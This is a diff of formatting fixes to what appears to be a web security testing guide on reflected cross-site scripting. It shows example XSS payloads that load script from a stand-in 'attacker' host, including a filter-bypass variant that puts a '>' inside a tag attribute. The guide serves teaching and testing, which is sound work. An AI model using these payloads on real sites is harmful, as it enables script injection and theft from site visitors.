@@ -64,7 +64,7 @@ A black-box test will include at least three phases:
   - `\uXXXX` (unicode values)
 <br>
 <br>
-## Example 1
+### Example 1
 
 For example, consider a site that has a welcome notice `Welcome %username%` and a download link.
 `http://example.com/index.php?user=Jhon`
@@ -144,7 +144,7 @@ Decoupling the above regular expression:
 
 This is useful for filtering expressions like `<script src="http://attacker/xss.js"></script>`
 which is a common attack. But, in this case, it is possible to bypass the sanitization by using the `>` character in an attribute between script and src, like this:
-`http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT
+`http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>`
 
 This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker’s web server as if it was originating from the victim web site, `http://example/`.
 <br>
